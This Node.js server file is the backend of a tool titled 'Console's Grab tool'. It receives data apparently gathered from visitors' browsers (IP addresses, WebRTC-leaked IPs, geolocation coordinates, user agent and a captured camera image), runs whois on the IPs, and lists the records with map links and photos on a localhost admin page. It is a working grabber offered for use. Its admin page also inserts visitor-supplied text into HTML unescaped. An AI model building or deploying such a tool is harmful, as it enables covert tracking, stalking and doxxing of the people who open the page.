const http = require('http');
const { exec } = require('child_process');
const net = require('net');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = 3000;

// --- Load config ---
const CONFIG_FILE = path.join(__dirname, 'config.json');
if (!fs.existsSync(CONFIG_FILE)) {
  console.error('Config file not found. Run pass.py first.');
  process.exit(1);
}
const CONFIG = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));

// --- Data / images ---
const DATA_FILE = path.join(__dirname, 'data.json');
const IMAGE_DIR = path.join(__dirname, 'images');
if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);

// --- Utility: check if IP is public ---
function isPublicIP(ip) {
  if (net.isIP(ip) === 4) {
    return !(
      /^10\./.test(ip) ||
      /^192\.168\./.test(ip) ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip) ||
      /^127\./.test(ip) ||
      /^169\.254\./.test(ip)
    );
  }
  if (net.isIP(ip) === 6) {
    const s = ip.toLowerCase();
    return !(s === '::1' || s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80'));
  }
  return false;
}

// --- Whois helper ---
function runWhois(ip, cb) {
  exec(`whois "${ip}"`, { timeout: 10000, maxBuffer: 1024 * 1024 }, (err, stdout) => {
    cb(err ? `WHOIS error: ${err.message}` : stdout);
  });
}

// --- IP label helper ---
function ipLabel(ip, type) {
  const version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
  if (isPublicIP(ip)) {
    return `<span style="color:#0ff;">[PUBLIC ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  } else {
    return `<span style="color:#ff0;">[LOCAL ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  }
}

// --- Save record ---
function saveRecord(record) {
  let arr = [];
  if (fs.existsSync(DATA_FILE)) {
    try {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      arr = raw.trim() ? JSON.parse(raw) : [];
    } catch (e) {
      console.error("Failed to parse data.json:", e);
      arr = [];
    }
  }
  arr.push(record);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

// --- Server ---
const server = http.createServer((req, res) => {
  let clientIP = req.socket.remoteAddress || '';
  clientIP = clientIP.replace(/^::ffff:/, ''); // normalize IPv4-mapped IPv6

  console.log("Client IP:", clientIP);

  // Serve images
  if (req.url.startsWith('/images/')) {
    const file = path.join(IMAGE_DIR, path.basename(req.url));
    if (fs.existsSync(file)) {
      res.writeHead(200, { 'Content-Type': 'image/png' });
      return fs.createReadStream(file).pipe(res);
    }
    res.writeHead(404); return res.end('Not found');
  }

  // Handle uploads
  if (req.url === '/collect' && req.method === 'POST') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let record = {
          timestamp: new Date().toISOString(),
          serverObservedIP: clientIP,
          externalPublicIP: data.publicIP || null,
          webrtcIPs: data.webrtcIPs || [],
          geolocation: data.geolocation || null,
          userAgent: data.userAgent || '',
          whois: {},
          imageFile: null
        };

        if (data.image) {
          const imgName = `capture_${Date.now()}.png`;
          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
          record.imageFile = imgName;
        }

        const ips = [];
        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });

        let pending = ips.length;
        if (pending === 0) { saveRecord(record); res.writeHead(200, {'Content-Type':'application/json'}); return res.end(JSON.stringify({status:'ok'})); }

        ips.forEach(ip => {
          runWhois(ip, out => {
            record.whois[ip] = out;
            if (--pending === 0) {
              saveRecord(record);
              res.writeHead(200, {'Content-Type':'application/json'});
              res.end(JSON.stringify({status:'ok'}));
            }
          });
        });
      } catch (e) {
        res.writeHead(400); res.end('bad json');
      }
    });
    return;
  }

  // --- Admin page ---
  if (req.url === '/admin') {
    // Only allow localhost
    if (!['127.0.0.1', '::1'].includes(clientIP)) {
      res.writeHead(403);
      return res.end('Forbidden: admin only accessible from localhost');
    }

    const auth = req.headers['authorization'] || '';
    if (!auth.startsWith('Basic ')) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Auth required');
    }

    const creds = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');
    if (creds.length < 2) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    const [inputUser, inputPass] = creds;

    // Scrypt password check
    const [salt, key] = CONFIG.adminHash.split(':');
    const hash = crypto.scryptSync(inputPass, salt, 64).toString('hex');
    const valid = crypto.timingSafeEqual(Buffer.from(hash,'hex'), Buffer.from(key,'hex'));

    if (inputUser !== CONFIG.adminUser || !valid) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    // Serve admin page
    let dataArr = [];
    if (fs.existsSync(DATA_FILE)) {
      try {
        const raw = fs.readFileSync(DATA_FILE,'utf8');
        dataArr = raw.trim() ? JSON.parse(raw) : [];
      } catch(e) {
        dataArr = [];
      }
    }

    // Show only last 20 records
    dataArr = dataArr.slice(-20);

    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title><style>'+
      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}' +
      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}' +
      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}' +
      '.label{color:#7fff7f; font-weight:bold;}' +        
      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}' +
      'a.geo{color:#00f;}' +
      'img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}' +
      '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
      `</style></head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;

    dataArr.forEach((rec, i) => {
      out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
      out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
      out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;
      out += `<span class="label">User-Agent:</span> <pre class="prebox">${rec.userAgent}</pre>`;
      if (rec.geolocation) {
        out += `<span class="label">Geolocation:</span> <a class="geo" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span>(±${rec.geolocation.acc}m)</span><br>`;
      }
      if (rec.webrtcIPs.length) {
        out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
        rec.webrtcIPs.forEach(ip => { out += ipLabel(ip,"WebRTC") + "\n"; });
        out += `</pre>`;
      }
      if (rec.imageFile) out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
      if (rec.whois) {
        for (let [ip, whois] of Object.entries(rec.whois)) {
          let version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
          let preview = whois.length > 1000 ? whois.slice(0,1000) + "\n[truncated]" : whois;
          out += `<h3 style="color:#0f0;">WHOIS for ${ip} (${version})</h3><pre class="prebox">${preview}</pre>`;
        }
      }
      out += `</div>`;
    });

    out += '</body></html>';
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(out);
  }

  // --- User-facing page ---
  const htmlPath = path.join(__dirname, 'user.html');
  if (fs.existsSync(htmlPath)) {
    let html = fs.readFileSync(htmlPath, 'utf8');
    html = html.replace('${serverIP}', clientIP);
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(html);
  }

  res.writeHead(404); res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log("Server running at http://localhost:" + PORT + "/");
});
